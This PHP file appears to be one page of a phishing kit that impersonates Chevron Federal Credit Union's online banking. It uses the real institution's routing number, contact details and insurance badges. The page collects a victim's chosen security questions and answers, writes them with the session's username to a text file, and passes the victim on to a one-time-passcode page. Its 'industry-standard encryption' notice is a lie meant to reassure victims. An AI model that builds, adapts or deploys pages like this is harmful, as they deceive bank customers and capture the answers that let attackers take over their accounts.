<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

$questions = [
    'What was your childhood nickname?',
    "What is your mother's maiden name?",
    'What was the name of your first pet?',
    'What was the make and model of your first car?',
    'What city were you born in?',
    'What is your favorite childhood memory?',
    'What was your first job title?',
    'What is the name of your favorite teacher?',
    'What is your favorite book or movie character?',
    'What street did you grow up on?'
];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $question1 = $_POST['question1'] ?? '';
    $answer1 = trim($_POST['answer1'] ?? '');
    $question2 = $_POST['question2'] ?? '';
    $answer2 = trim($_POST['answer2'] ?? '');
    $question3 = $_POST['question3'] ?? '';
    $answer3 = trim($_POST['answer3'] ?? '');
    
    // Validation
    if (empty($question1)) $errors['question1'] = 'Please select a question';
    if (empty($answer1)) $errors['answer1'] = 'Please provide an answer';
    if (empty($question2)) $errors['question2'] = 'Please select a question';
    if (empty($answer2)) $errors['answer2'] = 'Please provide an answer';
    if (empty($question3)) $errors['question3'] = 'Please select a question';
    if (empty($answer3)) $errors['answer3'] = 'Please provide an answer';
    
    // Check for duplicate questions
    $uniqueQuestions = array_unique([$question1, $question2, $question3]);
    if (count($uniqueQuestions) < 3) {
        $errors['general'] = 'Please select three different security questions';
    }
    
    if (empty($errors)) {
        // Save to test file
        $data = [
            'step' => 'security_questions',
            'usrnm' => $username,
            'chld_pt' => $question1,
            'pt_ans' => $answer1,
            'brth_ct' => $question2,
            'ct_ans' => $answer2,
            'frst_sch' => $question3,
            'sch_ans' => $answer3
        ];
        
        saveUserData('security_questions.txt', $data);
        
        // Redirect to OTP page
        header('Location: otp.php');
        exit;
    }
}

$supportLinks = ['Forgot User ID', 'Forgot Password', 'Unlock Account'];

$complianceBadges = [
    [
        'title' => 'EQUAL HOUSING LENDER',
        'description' => 'We do business in accordance with the Federal Fair Housing Law and the Equal Credit Opportunity Act.'
    ],
    [
        'title' => 'NCUA',
        'description' => 'Your savings federally insured to at least $250,000 and backed by the full faith and credit of the United States Government.'
    ]
];

$referenceColumns = [
    [
        'heading' => 'ROUTING NUMBER',
        'lines' => ['#321075947']
    ],
    [
        'heading' => 'PHONE NUMBER',
        'lines' => ['800-232-8101', '24-hour service']
    ],
    [
        'heading' => 'LINKS',
        'lines' => ['Privacy Policy', 'Accessibility', 'Disclosures', 'Security Policy', 'ATM and Branch Locations', 'Rates']
    ],
    [
        'heading' => 'MAILING ADDRESS',
        'lines' => ['Chevron Federal Credit Union', 'PO Box 4107', 'Concord, CA 94524']
    ]
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chevron Federal Credit Union - Security Questions</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-white text-[#0e2f56] flex flex-col">
        <!-- Main Content -->
        <main class="flex-1">
            <!-- Blue Gradient Section with Login Card -->
            <section class="bg-gradient-to-r from-[#002c5c] via-[#014a90] to-[#0073ba] py-12 px-4">
                <div class="max-w-5xl mx-auto">
                    <!-- Header Logo -->
                    <div class="flex items-center gap-4 mb-8">
                        <img
                            src="assets/header_logo_bg.png"
                            alt="Chevron Federal Credit Union"
                            class="h-16 w-auto"
                        />
                    </div>

                    <!-- Two Column Card -->
                    <div class="bg-gradient-to-b from-[#f0f6fb] to-[#dfeef9] shadow-2xl rounded-sm flex flex-col md:flex-row">
                        <!-- Left Column: Security Info -->
                        <div class="order-2 md:order-1 w-full md:w-5/12 px-8 py-10 border-t md:border-t-0 md:border-r border-[#91c1e4]">
                            <p class="text-2xl font-semibold text-[#0b5da7] mb-2">
                                Security Verification
                            </p>
                            <p class="text-sm text-[#0e2f56] mb-4">
                                To protect your account, please answer the following security questions. 
                                This helps us verify your identity and keep your information secure.
                            </p>
                            <div class="bg-blue-50 border border-blue-200 rounded-sm p-3">
                                <p class="text-xs text-blue-800 font-semibold">
                                    🔒 Your information is protected with industry-standard encryption
                                </p>
                            </div>
                        </div>

                        <!-- Right Column: Security Questions Form -->
                        <div class="order-1 md:order-2 w-full md:w-7/12 px-8 py-10">
                            <div class="flex flex-col md:flex-row md:items-center gap-4 mb-8">
                                <h2 class="text-lg font-semibold tracking-wide uppercase text-[#0e2f56]">
                                    Security Questions
                                </h2>
                                <span class="hidden md:block h-8 w-px bg-[#9cc5e3]"></span>
                                <div class="text-sm text-[#0b5da7">Step 1 of 6</div>
                            </div>

                            <?php if (!empty($errors)): ?>
                                <div class="bg-red-50 border-l-4 border-red-500 p-4 mb-6">
                                    <div class="flex">
                                        <div class="flex-shrink-0">
                                            <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                                <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                            </svg>
                                        </div>
                                        <div class="ml-3">
                                            <p class="text-sm text-red-700">
                                                Please fix the following errors:
                                                <ul class="list-disc pl-5 mt-1">
                                                    <?php foreach ($errors as $error): ?>
                                                        <li><?php echo htmlspecialchars($error); ?></li>
                                                    <?php endforeach; ?>
                                                </ul>
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            <?php endif; ?>

                            <form method="POST" action="" class="space-y-6">
                                <!-- Question 1 -->
                                <div class="space-y-2">
                                    <label class="block text-sm font-semibold text-[#0e2f56]">
                                        Security Question 1
                                    </label>
                                    <select name="question1" class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]">
                                        <option value="">Select a question</option>
                                        <?php foreach ($questions as $index => $question): ?>
                                            <option value="<?php echo htmlspecialchars($question); ?>" <?php echo (isset($_POST['question1']) && $_POST['question1'] === $question) ? 'selected' : ''; ?>>
                                                <?php echo htmlspecialchars($question); ?>
                                            </option>
                                        <?php endforeach; ?>
                                    </select>
                                    <?php if (isset($errors['question1'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600">
                                            <?php echo htmlspecialchars($errors['question1']); ?>
                                        </p>
                                    <?php endif; ?>
                                    <input
                                        type="text"
                                        name="answer1"
                                        value="<?php echo htmlspecialchars($_POST['answer1'] ?? ''); ?>"
                                        placeholder="Enter your answer"
                                        class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                    />
                                    <?php if (isset($errors['answer1'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600">
                                            <?php echo htmlspecialchars($errors['answer1']); ?>
                                        </p>
                                    <?php endif; ?>
                                </div>

                                <!-- Question 2 -->
                                <div class="space-y-2">
                                    <label class="block text-sm font-semibold text-[#0e2f56]">
                                        Security Question 2
                                    </label>
                                    <select name="question2" class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]">
                                        <option value="">Select a question</option>
                                        <?php foreach ($questions as $index => $question): ?>
                                            <option value="<?php echo htmlspecialchars($question); ?>" <?php echo (isset($_POST['question2']) && $_POST['question2'] === $question) ? 'selected' : ''; ?>>
                                                <?php echo htmlspecialchars($question); ?>
                                            </option>
                                        <?php endforeach; ?>
                                    </select>
                                    <?php if (isset($errors['question2'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600">
                                            <?php echo htmlspecialchars($errors['question2']); ?>
                                        </p>
                                    <?php endif; ?>
                                    <input
                                        type="text"
                                        name="answer2"
                                        value="<?php echo htmlspecialchars($_POST['answer2'] ?? ''); ?>"
                                        placeholder="Enter your answer"
                                        class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                    />
                                    <?php if (isset($errors['answer2'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600">
                                            <?php echo htmlspecialchars($errors['answer2']); ?>
                                        </p>
                                    <?php endif; ?>
                                </div>

                                <!-- Question 3 -->
                                <div class="space-y-2">
                                    <label class="block text-sm font-semibold text-[#0e2f56]">
                                        Security Question 3
                                    </label>
                                    <select name="question3" class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]">
                                        <option value="">Select a question</option>
                                        <?php foreach ($questions as $index => $question): ?>
                                            <option value="<?php echo htmlspecialchars($question); ?>" <?php echo (isset($_POST['question3']) && $_POST['question3'] === $question) ? 'selected' : ''; ?>>
                                                <?php echo htmlspecialchars($question); ?>
                                            </option>
                                        <?php endforeach; ?>
                                    </select>
                                    <?php if (isset($errors['question3'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600">
                                            <?php echo htmlspecialchars($errors['question3']); ?>
                                        </p>
                                    <?php endif; ?>
                                    <input
                                        type="text"
                                        name="answer3"
                                        value="<?php echo htmlspecialchars($_POST['answer3'] ?? ''); ?>"
                                        placeholder="Enter your answer"
                                        class="w-full border border-gray-400 bg-white px-3 py-2 text-sm shadow-inner focus:outline-none focus:ring-2 focus:ring-[#1d78c1]"
                                    />
                                    <?php if (isset($errors['answer3'])): ?>
                                        <p class="mt-2 text-xs font-semibold text-red-600">
                                            <?php echo htmlspecialchars($errors['answer3']); ?>
                                        </p>
                                    <?php endif; ?>
                                </div>

                                <!-- Submit Button -->
                                <div class="pt-4">
                                    <button
                                        type="submit"
                                        class="w-full md:w-auto bg-[#003e7d] text-white font-semibold px-7 py-2 text-sm rounded-sm shadow hover:bg-[#002c5c] disabled:opacity-70"
                                    >
                                        Continue
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </section>

            <!-- Compliance and Reference Information Section -->
            <section class="py-10 px-4">
                <div class="max-w-5xl mx-auto space-y-10 text-sm text-[#0e2f56]">
                    <!-- Compliance Badges -->
                    <div class="grid gap-6 md:grid-cols-2">
                        <?php foreach ($complianceBadges as $badge): ?>
                            <div class="border border-gray-200 rounded-sm p-5 shadow-sm bg-white">
                                <p class="font-semibold text-xs tracking-wide text-gray-700 mb-2 uppercase">
                                    <?php echo htmlspecialchars($badge['title']); ?>
                                </p>
                                <p class="text-sm text-gray-600 leading-relaxed">
                                    <?php echo htmlspecialchars($badge['description']); ?>
                                </p>
                            </div>
                        <?php endforeach; ?>
                    </div>

                    <!-- Reference Information Grid -->
                    <div class="grid gap-8 md:grid-cols-4">
                        <?php foreach ($referenceColumns as $column): ?>
                            <div class="space-y-2">
                                <p class="text-xs font-semibold tracking-wide text-gray-600 uppercase">
                                    <?php echo htmlspecialchars($column['heading']); ?>
                                </p>
                                <div class="space-y-1 text-sm text-gray-700">
                                    <?php foreach ($column['lines'] as $line): ?>
                                        <p><?php echo htmlspecialchars($line); ?></p>
                                    <?php endforeach; ?>
                                </div>
                            </div>
                        <?php endforeach; ?>
                    </div>
                </div>
            </section>
        </main>

        <!-- Footer -->
        <footer class="border-t border-gray-200">
            <div class="max-w-5xl mx-auto px-4 py-6 flex flex-col md:flex-row md:items-center md:justify-between gap-6">
                <div class="flex items-center justify-center md:justify-start gap-4">
                    <img
                        src="assets/equal-housing.png"
                        alt="Equal Housing Lender"
                        class="h-12 w-auto"
                    />
                    <img
                        src="assets/ncua.png"
                        alt="National Credit Union Administration"
                        class="h-12 w-auto"
                    />
                </div>
                <div class="text-xs text-gray-600 text-center md:text-right space-y-1">
                    <p>© 2025 Chevron Federal Credit Union</p>
                    <p>Version: 10.34.20250707.705.AWS</p>
                </div>
            </div>
        </footer>

        <!-- Help Button -->
        <button
            type="button"
            class="fixed bottom-6 right-6 inline-flex items-center gap-2 rounded-full bg-[#009a66] px-5 py-3 text-sm font-semibold text-white shadow-lg hover:bg-[#007a50]"
        >
            <span class="inline-flex items-center justify-center h-5 w-5 rounded-full bg-white text-[#009a66] text-xs font-bold">
                ?
            </span>
            Help
        </button>
    </div>
</body>
</html>
